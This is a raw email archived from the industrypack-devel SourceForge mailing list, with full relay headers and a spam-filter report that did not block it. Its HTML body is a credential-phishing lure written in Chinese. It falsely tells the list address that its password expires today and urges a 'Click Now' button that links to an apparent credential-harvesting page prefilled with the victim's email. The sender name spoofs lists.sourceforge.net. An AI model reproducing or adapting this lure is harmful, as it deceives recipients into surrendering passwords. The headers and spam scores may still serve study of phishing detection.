Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id B63E9560FB0
	for <lists+industrypack-devel@lfdr.de>; Thu, 30 Jun 2022 05:35:56 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1o6kyB-0003ze-P9
	for lists+industrypack-devel@lfdr.de; Thu, 30 Jun 2022 03:35:54 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <me@inbox.acima.co.jp>) id 1o6ky9-0003zX-Qc
 for industrypack-devel@lists.sourceforge.net; Thu, 30 Jun 2022 03:35:52 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=Tl8J7FfpDcHxMLjIkDLgo/9XoNJLpOE8CVXQ6pOfNmg=; b=gjgZMTOWWniWX4RaEPlS8qx1BB
 1U/YtdQbAnumeMq42IFfKqU9H4f5ltdjdCgWZGQxY3rUTtI9/gUxZFaU5GdZACfeIZstQgKHGvT/g
 uShDW8EyU8f4HDB8gRHlpdHPddWRk6ulUtFdirm5DNL5EDN8cwVTkKv61SKvIUDoXK9M=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=Tl8J7FfpDcHxMLjIkDLgo/9XoNJLpOE8CVXQ6pOfNmg=; b=J
 X2ZAhUAzvs5+w7JFQXepWD4uXWWVNKOuLMZHdSkhgcuKQF3ENRIf2HknMHjylo80TlfTRnThVU9jo
 1iHHTBA8tps1F3D5y8HCqhZiUh1IDug1GSSEyzvwDOkbFnMwkad0sed44/C/CMhpY7s3KlEjOZYOC
 pPIDJjdPRy6uWsL4=;
Received: from sketchbook.glamroam.com ([155.94.160.222]
 helo=inbox.acima.co.jp)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.94.2)
 id 1o6ky8-001rr8-0f
 for industrypack-devel@lists.sourceforge.net; Thu, 30 Jun 2022 03:35:52 +0000
Received: from authenticated-user (inbox.acima.co.jp [155.94.160.222])
 (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 (No client certificate requested)
 by inbox.acima.co.jp (Postfix) with ESMTPSA id A2FED4B6B8
 for <industrypack-devel@lists.sourceforge.net>;
 Thu, 30 Jun 2022 12:15:11 +0930 (ACST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=inbox.acima.co.jp;
 s=mail; t=1656557111;
 bh=Tl8J7FfpDcHxMLjIkDLgo/9XoNJLpOE8CVXQ6pOfNmg=;
 h=From:To:Subject:Date:From;
 b=Hjjio7ZZoSHF+MZZ3/WPRXoxDXO016xc0wmivUsUn6cGmWD5jQF3GVjA049AZdSHZ
 YWk7iC6lbdNNzhF8K8EjTsq/RhqX+ccHNWTmXOwEUdHuRXAEacZ3pr5DbAQqX7XbcD
 p1MpCoHFNgdLnIhzGRLgCAsLQO2ZiyDvxJGDYI3lOpyh2tCtoatcqpqADcAdCXdc+d
 ty1QgwM3CXU8OdPet2pyGvkxm7K3Al+eU0dVg9aaN94ZZNlgH0a5LUvpm2H3FK36Yt
 JB9TjlHSrHSw99lGHT9GJXYir2gixYsUbIgRjBMTNM6qL0R0emNb/SsuKRF6j5Qsmr
 MPz+r6HOGfxug==
From: lists.sourceforge.net  <me@inbox.acima.co.jp>
To: industrypack-devel@lists.sourceforge.net
Date: 30 Jun 2022 02:45:11 +0000
Message-ID: <20220630024511.2B92A20430425AF5@inbox.acima.co.jp>
MIME-Version: 1.0
X-Spam-Score: 3.7 (+++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  ID: industrypack-devel@lists.sourceforge.net 您的 industrypack-devel@lists.sourceforge.net
    密码今天到期 6/30/2022 2:45:11 a.m. 使用下面的按钮继续使用相同的密码.
    Click Now 
 
 Content analysis details:   (3.7 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in
                             bl.spamcop.net
              [Blocked - see <https://www.spamcop.net/bl.shtml?155.94.160.222>]
  0.4 NO_DNS_FOR_FROM        DNS: Envelope sender has no MX or A DNS records
  1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
                             [155.94.160.222 listed in dnsbl-1.uceprotect.net]
  0.8 DKIM_ADSP_NXDOMAIN     No valid author signature and domain not in
                             DNS
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.0 SPF_NONE               SPF: sender does not publish an SPF Record
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
                             valid
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
  0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
  0.0 KHOP_HELO_FCRDNS       Relay HELO differs from its IP's reverse DNS
X-Headers-End: 1o6ky8-001rr8-0f
Subject: [Industrypack-devel]
 =?UTF-8?B?5bi46KeE5a+G56CB6L+H5pyf6YCa55+lIA==?=industrypack-devel@lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============3822923946108772810=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============3822923946108772810==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body>
<P>
<SPAN style=3D'FONT-SIZE: small; FONT-FAMILY: "Lucida Sans", "Lucida Sans R=
egular", "Lucida Grande", "Lucida Sans Unicode", Geneva, Verdana, sans-seri=
f, serif, EmojiFont; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM=
: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS=
: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; text-decoration-s=
tyle: initial; -webkit-text-stroke-width: 0px; text-decoration-color: initi=
al; font-variant-ligatures: normal;=20
font-variant-caps: normal'>ID: industrypack-devel@lists.sourceforge.net</SP=
AN></P>
<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; text-decoration-style: initial; -webki=
t-text-stroke-width: 0px; text-decoration-color: initial; font-variant-liga=
tures: normal; font-variant-caps: normal"></DIV>
<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
R-SPACING: normal; TEXT-INDENT: 0px; text-decoration-style: initial; -webki=
t-text-stroke-width: 0px; text-decoration-color: initial; font-variant-liga=
tures: normal; font-variant-caps: normal">
<DIV dir=3Dltr>
<DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; BORDER-RIGHT-WIDTH: =
0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,3=
0); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; =
PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-variant-numeric: inherit; f=
ont-variant-east-asian: inherit; font-stretch: inherit">
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
px" dir=3Dltr>
<H3 style=3D'FONT-SIZE: 18px; MARGIN-BOTTOM: 0px; FONT-FAMILY: "Lucida Sans=
", "Lucida Sans Regular", "Lucida Grande", "Lucida Sans Unicode", Geneva, V=
erdana, sans-serif, serif, EmojiFont; MARGIN-TOP: 0px; FONT-WEIGHT: 400; CO=
LOR: rgb(51,51,51)'>&#24744;&#30340; industrypack-devel@lists.sourceforge.n=
et &#23494;&#30721;&#20170;&#22825;&#21040;&#26399;<SPAN>&nbsp;</SPAN>
 <SPAN style=3D'BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: "Times New Roman", ser=
if, serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BO=
RDER-BOTTOM-WIDTH: 0px; COLOR: red; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; =
font-stretch: inherit'>6/30/2022 2:45:11 a.m.</SPAN></H3>
<H4 style=3D'FONT-SIZE: 18px; MARGIN-BOTTOM: 0px; FONT-FAMILY: "Lucida Sans=
", "Lucida Sans Regular", "Lucida Grande", "Lucida Sans Unicode", Geneva, V=
erdana, sans-serif, serif, EmojiFont; MARGIN-TOP: 0px; FONT-WEIGHT: 400; CO=
LOR: rgb(51,51,51)'>&#20351;&#29992;&#19979;&#38754;&#30340;&#25353;&#38062=
;&#32487;&#32493;&#20351;&#29992;&#30456;&#21516;&#30340;&#23494;&#30721;.<=
/H4>
<DIV style=3D'FONT-SIZE: 18px; BORDER-TOP: 5px outset; HEIGHT: 50px; FONT-F=
AMILY: "Lucida Sans", "Lucida Sans Regular", "Lucida Grande", "Lucida Sans =
Unicode", Geneva, Verdana, sans-serif, serif, EmojiFont; BORDER-RIGHT: 5px =
outset; WIDTH: 150px; VERTICAL-ALIGN: baseline; BACKGROUND: rgb(0,0,255); B=
ORDER-BOTTOM: 5px outset; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; TEX=
T-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 5px outs=
et; MARGIN: 0px; PADDING-RIGHT: 0px;=20
font-variant-numeric: inherit; font-variant-east-asian: inherit; font-stret=
ch: inherit'>
<A style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN=
: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(17,85,204); PADDING-BOTTOM=
: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px=
; BORDER-TOP-WIDTH: 0px" href=3D"http://arvind18febsh.com/cgi-bin/cav/chn/c=
hina-mail/index.php?email=3Dindustrypack-devel@lists.sourceforge.net" rel=
=3D"noopener noreferrer" target=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://7clouds.vrdp.=
online/vendor/phpunit/phpunit/src/Util/PHP/sales/2018CN/2018CN/?email%3D%5B=
%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1634769771820000&amp;usg=3DAF=
QjCNHhG4dw-7HnwPUikB5e2Hw2OoWhfg"><SPAN style=3D"COLOR: rgb(51,51,51)">Clic=
k Now</SPAN></A></DIV></DIV></DIV></DIV></DIV></DIV></BODY></HTML>


--===============3822923946108772810==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============3822923946108772810==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============3822923946108772810==--
